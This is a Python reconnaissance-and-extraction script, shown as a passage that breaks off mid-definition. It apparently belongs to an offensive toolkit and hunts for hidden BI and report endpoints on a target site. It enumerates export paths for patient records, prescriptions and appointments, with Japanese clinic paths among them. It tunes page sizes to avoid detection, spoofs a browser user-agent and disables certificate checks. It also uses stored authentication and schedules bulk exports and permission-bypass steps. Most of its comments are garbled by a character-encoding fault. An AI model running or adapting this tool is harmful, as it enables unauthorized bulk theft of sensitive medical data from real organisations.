#!/usr/bin/env python3

#éšè—æŠ¥è¡¨åŠŸèƒ½å‘ç°è¢«ä½ä¼°å†…å®¹ï¼BIç³»ç»Ÿæ˜¯é‡ç¾åŒºï¼Œæ‰¾åˆ°å°±æ˜¯æ‰¹é‡æ•°æ®


import asyncio
import aiohttp
import re
import json
import logging
import sys
import os
from datetime import datetime, timedelta
from urllib.parse import urljoin, parse_qs, urlparse
import ssl
import certifi
import base64

# å¯¼å…¥æ™ºèƒ½é™åˆ¶ç®¡ç†å™¨
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from smart_limits import SmartLimitManager, SystemSize

# å¯¼å…¥å™ªéŸ³è¿‡æ»¤å™¨ - é˜²æ­¢æŠ¥è¡¨å‘ç°ä¸­çš„"å‚»é€¼å…´å¥‹"
try:
    from .third_party_blacklist import (
        smart_filter,
        is_third_party,
        has_security_value,
        analyze_noise_level,
        filter_third_party_urls
    )
    NOISE_FILTER_AVAILABLE = True
    print(" å™ªéŸ³è¿‡æ»¤å™¨å·²åŠ è½½ - é˜²æ­¢BIæŠ¥è¡¨å‚»é€¼å…´å¥‹")
except ImportError:
    NOISE_FILTER_AVAILABLE = False
    print(" è­¦å‘Š: å™ªéŸ³è¿‡æ»¤å™¨ä¸å¯ç”¨ï¼Œå¯èƒ½ä¼šæœ‰å¤§é‡ç¬¬ä¸‰æ–¹BIå™ªéŸ³")

# å¯¼å…¥ WAF Defender - é˜²æ­¢WAFæ¬ºéª—å“åº”
try:
    from .waf_defender import create_waf_defender, WAFDefender
    WAF_DEFENDER_AVAILABLE = True
    print(" WAF Defenderå·²åŠ è½½ - é˜²æ­¢WAFæ¬ºéª—å“åº”")
except ImportError:
    WAF_DEFENDER_AVAILABLE = False
    print(" è­¦å‘Š: WAF Defenderä¸å¯ç”¨ï¼Œå¯èƒ½ä¼šå—åˆ°WAFæ¬ºéª—")

# å¯¼å…¥è®¤è¯ç®¡ç†å™¨ - è®¿é—®è®¤è¯åçš„æŠ¥è¡¨é‡‘çŸ¿
try:
    from .auth_manager import AuthenticationManager, AuthConfig, create_auth_manager
    AUTH_MANAGER_AVAILABLE = True
    print("è®¤è¯ è®¤è¯ç®¡ç†å™¨å·²åŠ è½½ - å¯è®¿é—®è®¤è¯åæŠ¥è¡¨é‡‘çŸ¿")
except ImportError:
    AUTH_MANAGER_AVAILABLE = False
    print("   è­¦å‘Š: è®¤è¯ç®¡ç†å™¨ä¸å¯ç”¨ - æ— æ³•è®¿é—®è®¤è¯åæ•°æ®")

class HiddenReportFinder:
    def __init__(self, target_url, auth_config=None):
        self.target_url = target_url.rstrip('/')
        self.found_reports = []
        self.bi_systems = []
        self.export_endpoints = []
        self.extracted_data = []
        
        # è®¤è¯ç®¡ç†å™¨é…ç½®
        self.auth_manager = None
        self.auth_config = auth_config
        if AUTH_MANAGER_AVAILABLE and auth_config:
            try:
                if isinstance(auth_config, dict):
                    auth_config = AuthConfig(**auth_config)
                self.auth_manager = AuthenticationManager(auth_config)
                print("è®¤è¯ è®¤è¯ç®¡ç†å™¨åˆå§‹åŒ–æˆåŠŸ - å‡†å¤‡è®¿é—®è®¤è¯åæŠ¥è¡¨")
            except Exception as e:
                print(f"   è®¤è¯ç®¡ç†å™¨åˆå§‹åŒ–å¤±è´¥: {e}")
        
        # ç»Ÿä¸€sessionç®¡ç†
        self.session = None
        
        # æ™ºèƒ½é™åˆ¶ç®¡ç†å™¨
        self.limit_manager = SmartLimitManager()
        domain = urlparse(self.target_url).netloc
        target_info = {'domain': domain}
        self.system_size = self.limit_manager.detect_system_size(target_info)
        logging.info(f"[HiddenReportFinder] æ£€æµ‹åˆ°ç³»ç»Ÿè§„æ¨¡: {self.system_size.value}")
        
        # å™ªéŸ³è¿‡æ»¤ç»Ÿè®¡
        self.noise_stats = {
            'total_paths_tested': 0,
            'noise_filtered': 0,
            'valuable_findings': 0,
            'false_positives_filtered': 0,
            'waf_blocks_detected': 0
        }
        
        # WAF Defender çŠ¶æ€
        self.waf_defender = None
        self.waf_defender_initialized = False
        
        # æŠ€æœ¯æ ˆæ£€æµ‹ç»“æœï¼ˆç”¨äºæ™ºèƒ½è·¯å¾„ç”Ÿæˆï¼‰
        self.detected_tech_stack = {
            'language': 'unknown',  # java, php, python, nodejs, .net
            'framework': 'unknown',  # spring, laravel, django, express, asp.net
            'bi_systems': [],        # æ£€æµ‹åˆ°çš„BIç³»ç»Ÿ
            'cms': 'unknown',        # wordpress, drupal, joomla
            'country': 'unknown'     # jp, cn, us, euï¼ˆå½±å“è·¯å¾„æœ¬åœ°åŒ–ï¼‰
        }
        
        # æ™ºèƒ½è·¯å¾„ç¼“å­˜
        self.intelligent_paths = []
        self.path_generation_completed = False
        
        # æŠ¥è¡¨ç³»ç»Ÿè·¯å¾„
        self.report_paths = [
            # é€šç”¨æŠ¥è¡¨è·¯å¾„
            '/reports/', '/report/', '/reporting/', '/analytics/',
            '/statistics/', '/stats/', '/dashboard/', '/metrics/',
            '/export/', '/exports/', '/download/', '/downloads/',
            '/data/', '/query/', '/search/', '/view/',
            '/admin/reports/', '/admin/export/', '/admin/stats/',
            '/management/reports/', '/manager/reports/',
            
            # BIç³»ç»Ÿè·¯å¾„
            '/bi/', '/business-intelligence/', '/intelligence/',
            '/pentaho/', '/jasper/', '/jasperreports/', '/birt/',
            '/crystal/', '/crystalreports/', '/powerbi/', '/tableau/',
            '/qlik/', '/qlikview/', '/cognos/', '/microstrategy/',
            '/reportserver/', '/ssrs/', '/reports/ssrs/',
            
            # åŒ»ç–—ç³»ç»Ÿç‰¹å®š
            '/patient-reports/', '/medical-reports/', '/health-reports/',
            '/clinic-reports/', '/appointment-reports/', '/prescription-reports/',
            '/è¨ºç™‚ãƒ¬ãƒãƒ¼ãƒˆ/', '/æ‚£è€…çµ±è¨ˆ/', '/äºˆç´„ãƒ¬ãƒãƒ¼ãƒˆ/',
            
            # APIè·¯å¾„
            '/api/reports/', '/api/export/', '/api/statistics/',
            '/api/v1/reports/', '/api/v2/reports/', '/rest/reports/',
            '/graphql/', '/_api/reports/', '/odata/',
            
            # éšè—/ä¸´æ—¶è·¯å¾„
            '/_reports/', '/.reports/', '/~reports/', '/temp/reports/',
            '/tmp/reports/', '/cache/reports/', '/backup/reports/',
            '/old/reports/', '/legacy/reports/', '/deprecated/reports/'
        ]
        
        # æŠ¥è¡¨æ–‡ä»¶å
        self.report_files = [
            # æ‚£è€…ç›¸å…³
            'patients', 'patient_list', 'patient_summary', 'patient_details',
            'all_patients', 'patient_export', 'patient_data', 'patient_records',
            'medical_records', 'health_records', 'clinical_data',
            
            # é¢„çº¦ç›¸å…³
            'appointments', 'appointment_list', 'appointment_summary',
            'booking_report', 'schedule_report', 'calendar_export',
            
            # ç»Ÿè®¡æŠ¥è¡¨
            'statistics', 'summary', 'overview', 'dashboard',
            'monthly_report', 'yearly_report', 'annual_report',
            'daily_summary', 'weekly_summary', 'quarterly_report',
            
            # å¯¼å‡ºæ–‡ä»¶
            'export', 'full_export', 'data_export', 'backup',
            'dump', 'extract', 'download', 'output',
            
            # æ—¥æ–‡
            'æ‚£è€…ä¸€è¦§', 'è¨ºç™‚è¨˜éŒ²', 'äºˆç´„ä¸€è¦§', 'çµ±è¨ˆæƒ…å ±',
            'ãƒ¬ãƒãƒ¼ãƒˆ', 'ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆ', 'ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰'
        ]
        
        # æŠ¥è¡¨å‚æ•°
        self.report_params = {
            # æ—¶é—´èŒƒå›´
            'date_from': ['2023-01-01', '2024-01-01'],
            'date_to': ['2024-12-31', datetime.now().strftime('%Y-%m-%d')],
            'start_date': ['2023-01-01', '2024-01-01'],
            'end_date': ['2024-12-31', datetime.now().strftime('%Y-%m-%d')],
            'from': ['2023-01-01', '0'],
            'to': ['2024-12-31', '9999999999'],
            'period': ['all', 'year', 'month', 'custom'],
            'range': ['all', 'thisyear', 'lastyear', 'custom'],
            
            # æ•°æ®ç±»å‹
            'type': ['patient', 'appointment', 'prescription', 'all'],
            'report_type': ['summary', 'detail', 'full', 'export'],
            'format': ['json', 'csv', 'excel', 'pdf', 'xml'],
            'export_format': ['csv', 'xlsx', 'json', 'xml'],
            
            # åˆ†é¡µ (æ™ºèƒ½é™åˆ¶ - é¿å…è§¦å‘é˜²æŠ¤)
            'limit': self._get_smart_pagination_values(),
            'page_size': self._get_smart_pagination_values(),
            'per_page': self._get_smart_pagination_values(),
            'count': self._get_smart_pagination_values(),
            
            # å…¶ä»–
            'download': ['true', '1', 'yes'],
            'export': ['true', '1', 'yes'],
            'full': ['true', '1', 'yes'],
            'all': ['true', '1', 'yes']
        }
        
        # BIç³»ç»Ÿç‰¹å¾
        self.bi_signatures = {
            'pentaho': {
                'paths': ['/pentaho/', '/pentaho-di/', '/biserver/'],
                'files': ['Reporting', 'Report.prpt', 'api/repos'],
                'params': ['renderMode=REPORT', 'output-target=pageable/pdf']
            },
            'jasperreports': {
                'paths': ['/jasperserver/', '/jasper/', '/reports/jasper/'],
                'files': ['flow.html', 'jasperprint', '.jrxml'],
                'params': ['_flowId=viewReportFlow', 'reportUnit=']
            },
            'crystal': {
                'paths': ['/crystalreportviewers/', '/crystal/'],
                'files': ['CrystalReportViewer.aspx', '.rpt'],
                'params': ['ReportSource=', 'id=']
            },
            'ssrs': {
                'paths': ['/ReportServer/', '/Reports/', '/reportserver/'],
                'files': ['Pages/ReportViewer.aspx', '.rdl'],
                'params': ['%2f', 'rs:Command=Render', 'rs:Format=']
            },
            'tableau': {
                'paths': ['/t/', '/views/', '/vizportal/'],
                'files': ['bootstrap.json', 'vizql/'],
                'params': [':embed=y', ':showVizHome=no']
            }
        }

    def _get_smart_pagination_values(self):
        """è·å–æ™ºèƒ½åˆ†é¡µå€¼.é¿å…è§¦å‘é˜²æŠ¤"""
        # è·å–åŸºç¡€é™åˆ¶
        base_limit = self.limit_manager.get_api_limit(self.system_size, 'report')
        
        # ç”Ÿæˆå¤šç§å®‰å…¨çš„åˆ†é¡µå€¼
        values = [
            str(base_limit // 4),      # ä¿å®ˆå€¼ 
            str(base_limit // 2),      # ä¸­ç­‰å€¼
            str(base_limit),           # æ ‡å‡†å€¼
            str(int(base_limit * 1.5)) # ç¨å¤§å€¼
        ]
        
        # æ·»åŠ ä¸€äº›å¸¸è§çš„å®‰å…¨å€¼
        safe_values = ['50', '100', '200', '500']
        for val in safe_values:
            if val not in values:
                values.append(val)
        
        return values

    async def detect_tech_stack(self):
        """æ£€æµ‹ç›®æ ‡æŠ€æœ¯æ ˆ - ç”¨äºæ™ºèƒ½è·¯å¾„ç”Ÿæˆ"""
        print("[+] æ£€æµ‹æŠ€æœ¯æ ˆ...")
        
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        
        async with aiohttp.ClientSession(connector=conn) as session:
            try:
                async with session.get(self.target_url, timeout=10) as resp:
                    headers = dict(resp.headers)
                    content = await resp.text()
                    
                    # æ£€æµ‹ç¼–ç¨‹è¯­è¨€
                    if 'X-Powered-By' in headers:
                        powered_by = headers['X-Powered-By'].lower()
                        if 'php' in powered_by:
                            self.detected_tech_stack['language'] = 'php'
                        elif 'asp.net' in powered_by:
                            self.detected_tech_stack['language'] = '.net'
                    
                    # æ£€æµ‹æ¡†æ¶ç‰¹å¾
                    if 'jsessionid' in str(resp.url).lower() or 'jsessionid' in content.lower():
                        self.detected_tech_stack['language'] = 'java'
                        if 'spring' in content.lower():
                            self.detected_tech_stack['framework'] = 'spring'
                    
                    # æ£€æµ‹å›½å®¶/è¯­è¨€ç‰¹å¾
                    if any(char in content for char in ['è¨ºç™‚', 'æ‚£è€…', 'äºˆç´„', 'ãƒ¬ãƒãƒ¼ãƒˆ']):
                        self.detected_tech_stack['country'] = 'jp'
                    elif any(char in content for char in ['è¯Šç–—', 'æ‚£è€…', 'é¢„çº¦', 'æŠ¥è¡¨']):
                        self.detected_tech_stack['country'] = 'cn'
                        
                    # æ£€æµ‹CMS
                    if 'wp-content' in content or 'wordpress' in content.lower():
                        self.detected_tech_stack['cms'] = 'wordpress'
                    elif 'drupal' in content.lower():
                        self.detected_tech_stack['cms'] = 'drupal'
                        
                    print(f"    æ£€æµ‹åˆ°æŠ€æœ¯æ ˆ: {self.detected_tech_stack}")
                    
            except Exception as e:
                print(f"    æŠ€æœ¯æ ˆæ£€æµ‹å¤±è´¥: {e}")

    def generate_intelligent_paths(self):
        """åŸºäºæŠ€æœ¯æ ˆå’Œæ—¶é—´ç»´åº¦ç”Ÿæˆæ™ºèƒ½è·¯å¾„"""
        if self.path_generation_completed:
            return self.intelligent_paths
            
        print("[+] ç”Ÿæˆæ™ºèƒ½åŒ–æŠ¥è¡¨è·¯å¾„...")
        paths = set()
        
        # 1. åŸºç¡€æŠ¥è¡¨è·¯å¾„
        base_paths = [
            '/reports/', '/report/', '/reporting/', '/analytics/',
            '/statistics/', '/stats/', '/dashboard/', '/metrics/',
            '/export/', '/exports/', '/download/', '/downloads/'
        ]
        
        # 2. åŸºäºç¼–ç¨‹è¯­è¨€çš„è·¯å¾„
        if self.detected_tech_stack['language'] == 'java':
            paths.update([
                '/jasperreports/', '/jasper/', '/birt/', '/pentaho/',
                '/reports/jasperserver/', '/reportserver/', 
                '/WEB-INF/reports/', '/META-INF/reports/'
            ])
        elif self.detected_tech_stack['language'] == 'php':
            paths.update([
                '/phpMyAdmin/export.php', '/adminer.php',
                '/reports/index.php', '/export.php', '/download.php'
            ])
        elif self.detected_tech_stack['language'] == '.net':
            paths.update([
                '/ReportServer/', '/Reports/', '/SSRS/',
                '/CrystalReports/', '/bin/reports/', '/App_Data/reports/'
            ])
        
        # 3. åŸºäºæ¡†æ¶çš„è·¯å¾„
        if self.detected_tech_stack['framework'] == 'spring':
            paths.update([
                '/actuator/export', '/management/export',
                '/api/reports/', '/rest/reports/', '/services/reports/'
            ])
        
        # 4. åŸºäºå›½å®¶/è¯­è¨€çš„æœ¬åœ°åŒ–è·¯å¾„
        if self.detected_tech_stack['country'] == 'jp':
            paths.update([
                '/è¨ºç™‚ãƒ¬ãƒãƒ¼ãƒˆ/', '/æ‚£è€…çµ±è¨ˆ/', '/äºˆç´„ãƒ¬ãƒãƒ¼ãƒˆ/', '/åŒ»ç™‚è¨˜éŒ²/',
                '/ãƒ¬ãƒãƒ¼ãƒˆ/', '/çµ±è¨ˆ/', '/ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰/', '/ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆ/',
                '/reports/æ‚£è€…/', '/reports/è¨ºç™‚/', '/data/æ‚£è€…ä¸€è¦§/'
            ])
        elif self.detected_tech_stack['country'] == 'cn':
            paths.update([
                '/è¯Šç–—æŠ¥è¡¨/', '/æ‚£è€…ç»Ÿè®¡/', '/é¢„çº¦æŠ¥è¡¨/', '/åŒ»ç–—è®°å½•/',
                '/æŠ¥è¡¨/', '/ç»Ÿè®¡/', '/ä¸‹è½½/', '/å¯¼å‡º/',
                '/reports/æ‚£è€…/', '/reports/è¯Šç–—/', '/data/æ‚£è€…åˆ—è¡¨/'
            ])
        
        # 5. æ—¶é—´ç»´åº¦è·¯å¾„ï¼ˆå½“å‰å’Œå†å²ï¼‰
        from datetime import datetime, timedelta
        now = datetime.now()
        
        # å½“å‰æ—¶é—´ç›¸å…³
        current_year = now.year
        current_month = now.month
        current_day = now.day
        
        time_based_paths = []
        for base in ['/reports/', '/export/', '/backup/', '/archive/']:
            # å¹´åº¦æŠ¥è¡¨
            time_based_paths.extend([
                f'{base}{current_year}/',
                f'{base}{current_year-1}/',
                f'{base}å¹´åº¦/{current_year}/',
                f'{base}yearly/{current_year}/'
            ])
            
            # æœˆåº¦æŠ¥è¡¨
            time_based_paths.extend([
                f'{base}{current_year}/{current_month:02d}/',
                f'{base}monthly/{current_year}-{current_month:02d}/',
                f'{base}æœˆæŠ¥/{current_year}-{current_month:02d}/'
            ])
            
            # æ—¥æŠ¥è¡¨
            time_based_paths.extend([
                f'{base}{current_year}/{current_month:02d}/{current_day:02d}/',
                f'{base}daily/{current_year}-{current_month:02d}-{current_day:02d}/',
                f'{base}æ—¥æŠ¥/{current_year}{current_month:02d}{current_day:02d}/'
            ])
        
        paths.update(time_based_paths)
        
        # 6. åŸºäºå·²æ£€æµ‹BIç³»ç»Ÿçš„ä¸“ç”¨è·¯å¾„
        for bi_system in self.detected_tech_stack['bi_systems']:
            if bi_system == 'tableau':
                paths.update([
                    '/t/views/', '/vizportal/api/', '/ts-api/rest/',
                    '/vizql/w/', '/manual_update.csv'
                ])
            elif bi_system == 'powerbi':
                paths.update([
                    '/powerbi/', '/pbi/', '/reports/powerbi/',
                    '/api/powerbi/', '/_api/powerbi/'
                ])
        
        # 7. éšè—å’Œä¸´æ—¶è·¯å¾„
        hidden_paths = [
            '/_reports/', '/.reports/', '/~reports/', '/.well-known/reports/',
            '/temp/reports/', '/tmp/reports/', '/cache/reports/',
            '/backup/reports/', '/old/reports/', '/legacy/reports/',
            '/deprecated/reports/', '/archive/reports/', '/staging/reports/'
        ]
        paths.update(hidden_paths)
        
        # è½¬æ¢ä¸ºåˆ—è¡¨å¹¶æ·»åŠ åŸºç¡€è·¯å¾„
        self.intelligent_paths = list(base_paths) + list(paths)
        self.path_generation_completed = True
        
        print(f"    ç”Ÿæˆäº† {len(self.intelligent_paths)} ä¸ªæ™ºèƒ½è·¯å¾„")
        return self.intelligent_paths

    def is_noise_response(self, resp, content=None):
        """æ™ºèƒ½å™ªéŸ³æ£€æµ‹ - è¯†åˆ«404ã€WAFã€é”™è¯¯é¡µé¢"""
        # 1. æ˜æ˜¾çš„é”™è¯¯çŠ¶æ€ç 
        if resp.status in [404, 500, 502, 503, 504]:
            return True, f"é”™è¯¯çŠ¶æ€ç : {resp.status}"
        
        # 2. WAFæ‹¦æˆªæ£€æµ‹
        waf_indicators = [
            'cloudflare', 'incapsula', 'sucuri', 'firewall',
            'blocked', 'forbidden', 'access denied', 'security violation',
            'your request has been blocked', 'this request is blocked'
        ]
        
        content_lower = (content or '').lower()
        page_title = resp.headers.get('title', '').lower()
        server_header = resp.headers.get('server', '').lower()
        
        for indicator in waf_indicators:
            if (indicator in content_lower or 
                indicator in page_title or 
                indicator in server_header):
                self.noise_stats['waf_blocks_detected'] += 1
                return True, f"WAFæ‹¦æˆª: {indicator}"
        
        # 3. é»˜è®¤é”™è¯¯é¡µé¢æ£€æµ‹
        error_patterns = [
            'not found', '404 error', 'page not found',
            'file not found', 'directory not found',
            'default web site page', 'iis7', 'apache2',
            'nginx default page', 'welcome to nginx'
        ]
        
        for pattern in error_patterns:
            if pattern in content_lower:
                return True, f"é»˜è®¤é”™è¯¯é¡µé¢: {pattern}"
        
        # 4. ç¬¬ä¸‰æ–¹æœåŠ¡æ£€æµ‹
        if NOISE_FILTER_AVAILABLE:
            if is_third_party(str(resp.url)):
                # ä½†å¦‚æœæœ‰å®‰å…¨ä»·å€¼ï¼Œä»ç„¶ä¿ç•™
                if not has_security_value(str(resp.url)):
                    return True, "ç¬¬ä¸‰æ–¹æœåŠ¡å™ªéŸ³"
        
        # 5. å†…å®¹å¤§å°æ£€æµ‹ï¼ˆå¤ªå°å¯èƒ½æ˜¯é”™è¯¯é¡µé¢ï¼‰
        content_length = int(resp.headers.get('Content-Length', len(content or '')))
        if content_length < 200:  # å°äº200å­—èŠ‚
            return True, f"å†…å®¹è¿‡å°: {content_length}å­—èŠ‚"
        
        # 6. é‡å®šå‘åˆ°ä¸»é¡µæ£€æµ‹
        if resp.status in [301, 302, 307, 308]:
            location = resp.headers.get('Location', '')
            if location in ['/', '/index.html', '/index.php', '/home']:
                return True, f"é‡å®šå‘åˆ°ä¸»é¡µ: {location}"
        
        return False, "æ­£å¸¸å“åº”"

    async def _initialize_waf_defender(self):
        """åˆå§‹åŒ– WAF Defender"""
        if not WAF_DEFENDER_AVAILABLE or self.waf_defender_initialized:
            return
        
        try:
            print("[+] åˆå§‹åŒ–WAF Defender...")
            
            # åˆ›å»ºä¸´æ—¶sessionç”¨äºåˆå§‹åŒ–
            ssl_context = ssl.create_default_context(cafile=certifi.where())
            conn = aiohttp.TCPConnector(ssl=ssl_context)
            
            async with aiohttp.ClientSession(connector=conn) as session:
                self.waf_defender = await create_waf_defender(self.target_url, session)
                self.waf_defender_initialized = True
                
                print(f"    WAF Defenderåˆå§‹åŒ–æˆåŠŸ (ç›®æ ‡: {self.target_url})")
            
        except Exception as e:
            print(f"    WAF Defenderåˆå§‹åŒ–å¤±è´¥: {e}")
            self.waf_defender = None
            self.waf_defender_initialized = False

    async def _validate_response_with_waf(self, url: str, response, expected_type: str = None) -> bool:
        """ä½¿ç”¨WAF DefenderéªŒè¯å“åº”çœŸå®æ€§"""
        if not self.waf_defender or not self.waf_defender_initialized or response.status != 200:
            return True  # å¦‚æœWAF Defenderä¸å¯ç”¨æˆ–é200çŠ¶æ€ï¼Œé»˜è®¤é€šè¿‡
        
        try:
            is_real = await self.waf_defender.simple_validate(url, response)
            if not is_real:
                print(f"    WAFæ¬ºéª—æ£€æµ‹: {url} - è·³è¿‡ä¼ªé€ å“åº”")
                return False
            return True
        except Exception as e:
            print(f"    WAFéªŒè¯å¼‚å¸¸: {e}")
            return True  # å¼‚å¸¸æ—¶é»˜è®¤é€šè¿‡

    async def _create_session(self):
        """åˆ›å»ºç»Ÿä¸€çš„HTTP session - æ”¯æŒè®¤è¯"""
        if self.session and not self.session.closed:
            return self.session
        
        # SSLé…ç½®
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        # è¿æ¥å™¨é…ç½®
        conn = aiohttp.TCPConnector(
            ssl=ssl_context,
            limit=100,
            limit_per_host=30,
            ttl_dns_cache=300,
            use_dns_cache=True
        )
        
        # åˆ›å»ºsession
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        self.session = aiohttp.ClientSession(
            connector=conn,
            timeout=timeout,
            headers=headers
        )
        
        return self.session

    async def _safe_request(self, method: str, url: str, **kwargs):
        """å®‰å…¨çš„HTTPè¯·æ±‚ - æ”¯æŒè®¤è¯ç®¡ç†å™¨"""
        if not self.session:
            await self._create_session()
        
        # å¦‚æœå¯ç”¨äº†è®¤è¯ç®¡ç†å™¨ï¼Œä¸ºè¯·æ±‚æ·»åŠ è®¤è¯ä¿¡æ¯
        if self.auth_manager:
            try:
                kwargs = await self.auth_manager.prepare_request(url, **kwargs)
            except Exception as e:
                print(f"è®¤è¯ è®¤è¯å‡†å¤‡å¤±è´¥: {e}")
        
        try:
            # å‘èµ·è¯·æ±‚
            response = await self.session.request(method, url, **kwargs)
            
            # æ£€æŸ¥è®¤è¯çŠ¶æ€
            if self.auth_manager:
                auth_ok = await self.auth_manager.handle_response(response, url)
                if not auth_ok and self.auth_manager.should_retry(response):
                    # è®¤è¯å¤±æ•ˆï¼Œå°è¯•æ¢å¤
                    print("[!] æ£€æµ‹åˆ°è®¤è¯å¤±æ•ˆï¼Œå°è¯•æ¢å¤...")
                    await response.release()  # é‡Šæ”¾è¿æ¥
                    
                    recovery_success = await self.auth_manager._recover_authentication()
                    if recovery_success:
                        # é‡æ–°å‡†å¤‡è¯·æ±‚
                        kwargs = await self.auth_manager.prepare_request(url, **kwargs)
                        # é‡è¯•è¯·æ±‚
                        response = await self.session.request(method, url, **kwargs)
            
            return response
            
        except Exception as e:
            print(f"è®¤è¯ è¯·æ±‚å¼‚å¸¸: {e}")
            return None

    async def _cleanup_session(self):
        """æ¸…ç†sessionèµ„æº"""
        if self.session and not self.session.closed:
            await self.session.close()
        
        if self.auth_manager:
            try:
                await self.auth_manager.cleanup()
            except Exception as e:
                print(f"è®¤è¯ è®¤è¯ç®¡ç†å™¨æ¸…ç†å¼‚å¸¸: {e}")

    async def run(self):
        """ä¸»æ‰§è¡Œå‡½æ•° - æ™ºèƒ½åŒ–å‡çº§ç‰ˆ + è®¤è¯æ”¯æŒ"""
        print(f"[*]  å¼€å§‹æ™ºèƒ½åŒ–éšè—æŠ¥è¡¨åŠŸèƒ½å‘ç°: {self.target_url}")
        print(f"[*] æ—¶é—´: {datetime.now()}")
        noise_status = "OK" if NOISE_FILTER_AVAILABLE else "é”™è¯¯"
        waf_status = "OK" if WAF_DEFENDER_AVAILABLE else "é”™è¯¯"
        auth_status = "è®¤è¯OK" if self.auth_manager else "ğŸ”“"
        print(f"[*] å™ªéŸ³è¿‡æ»¤: {noise_status}")
        print(f"[*] WAFé˜²æŠ¤: {waf_status}")
        print(f"[*] è®¤è¯ç®¡ç†: {auth_status}")
        
        try:
            # åˆå§‹åŒ–ç»„ä»¶
            await self._create_session()
            await self._initialize_waf_defender()
            
            # åˆå§‹åŒ–è®¤è¯ç®¡ç†å™¨
            if self.auth_manager:
                await self.auth_manager.initialize()
                print("è®¤è¯ è®¤è¯ç®¡ç†å™¨åˆå§‹åŒ–å®Œæˆ - å‡†å¤‡è®¿é—®è®¤è¯åæŠ¥è¡¨é‡‘çŸ¿")
                
                # æ˜¾ç¤ºè®¤è¯ç»Ÿè®¡
                auth_stats = self.auth_manager.get_auth_stats()
                auth_type = auth_stats.get('current_auth_type', 'unknown')
                print(f"è®¤è¯ è®¤è¯ç±»å‹: {auth_type}")
            
            # 0. æŠ€æœ¯æ ˆæ£€æµ‹ï¼ˆæ–°å¢ - ç”¨äºæ™ºèƒ½è·¯å¾„ç”Ÿæˆï¼‰
            await self.detect_tech_stack()
            
            # 1. ç”Ÿæˆæ™ºèƒ½è·¯å¾„ï¼ˆæ–°å¢ - åŸºäºæŠ€æœ¯æ ˆï¼‰
            self.generate_intelligent_paths()
            
            # 2. æ¢æµ‹BIç³»ç»Ÿï¼ˆå¢å¼ºç‰ˆï¼‰
            await self.detect_bi_systems_enhanced()
            
            # 3. å‘ç°æŠ¥è¡¨ç«¯ç‚¹ï¼ˆæ™ºèƒ½è¿‡æ»¤ç‰ˆï¼‰
            await self.discover_report_endpoints_smart()
            
            # 4. æ·±åº¦å‚æ•°æšä¸¾ï¼ˆæ–°å¢ï¼‰
            await self.deep_parameter_enumeration()
            
            # 5. æµ‹è¯•æŠ¥è¡¨å‚æ•°ï¼ˆå¢å¼ºç‰ˆï¼‰
            await self.test_report_parameters_enhanced()
            
            # 6. å°è¯•æ‰¹é‡å¯¼å‡ºï¼ˆæ™ºèƒ½ç‰ˆï¼‰
            await self.attempt_bulk_export_smart()
            
            # 7. æ¢æµ‹GraphQLï¼ˆå¢å¼ºç‰ˆï¼‰
            await self.detect_graphql_enhanced()
            
            # 8. éšè—è·¯å¾„å‘ç°ï¼ˆæ–°å¢ï¼‰
            await self.discover_hidden_paths()
            
            # 9. æƒé™ç»•è¿‡å°è¯•ï¼ˆæ–°å¢ï¼‰
            await self.attempt_bypass_techniques()
            
            # 10. ç”Ÿæˆæ™ºèƒ½æŠ¥å‘Š
            self.generate_smart_report()
            
            return self.found_reports
            
        except Exception as e:
            print(f"[!] éšè—æŠ¥è¡¨å‘ç°å¼‚å¸¸: {e}")
            raise
        finally:
            # æ¸…ç†èµ„æº
            await self._cleanup_session()

    async def detect_bi_systems_enhanced(self):
        """å¢å¼ºç‰ˆBIç³»ç»Ÿæ¢æµ‹ - é›†æˆå™ªéŸ³è¿‡æ»¤"""
        print("[+]  å¢å¼ºç‰ˆBIç³»ç»Ÿæ¢æµ‹...")
        
        # æ‰©å±•BIç³»ç»Ÿç‰¹å¾åº“ï¼ˆåŒ…å«æ—¥æœ¬ä¸»æµBIï¼‰
        enhanced_bi_signatures = {
            'pentaho': {
                'paths': ['/pentaho/', '/pentaho-di/', '/biserver/', '/pentaho/content/'],
                'files': ['Reporting', 'Report.prpt', 'api/repos', 'pentaho.xml'],
                'params': ['renderMode=REPORT', 'output-target=pageable/pdf'],
                'headers': ['x-pentaho-depth']
            },
            'jasperreports': {
                'paths': ['/jasperserver/', '/jasper/', '/reports/jasper/', '/jasperserver/rest/'],
                'files': ['flow.html', 'jasperprint', '.jrxml', 'reportExecution'],
                'params': ['_flowId=viewReportFlow', 'reportUnit=', 'j_username='],
                'headers': ['jasperserver-pro']
            },
            'tableau': {
                'paths': ['/t/', '/views/', '/vizportal/', '/ts-api/', '/manual_update.csv'],
                'files': ['bootstrap.json', 'vizql/', 'workbooks', 'datasources'],
                'params': [':embed=y', ':showVizHome=no', ':toolbar=no'],
                'headers': ['x-tableau-feature-flags']
            },
            'powerbi': {
                'paths': ['/powerbi/', '/pbi/', '/reports/powerbi/', '/reportserver/'],
                'files': ['models.json', 'reports/', 'dashboards/', 'datasets/'],
                'params': ['reportId=', 'groupId=', 'datasetId='],
                'headers': ['x-powerbi-error-info']
            },
            'qlik': {
                'paths': ['/qmc/', '/hub/', '/sense/', '/qlikview/', '/accesspoint/'],
                'files': ['qlik-embed.js', 'qlik.js', 'session.js'],
                'params': ['qlikTicket=', 'QvUser='],
                'headers': ['x-qlik-user']
            },
            # æ—¥æœ¬ä¸»æµBIç³»ç»Ÿ
            'motionboard': {
                'paths': ['/motionboard/', '/mb/', '/MotionBoard/'],
                'files': ['MBServlet', 'motionboard.js'],
                'params': ['boardId=', 'userId='],
                'headers': ['x-motionboard']
            },
            'yellowfin': {
                'paths': ['/yellowfin/', '/yf/', '/reports/yellowfin/'],
                'files': ['yellowfin.js', 'rptws/', 'logon.jsp'],
                'params': ['reportId=', 'orgId='],
                'headers': ['yellowfin-version']
            },
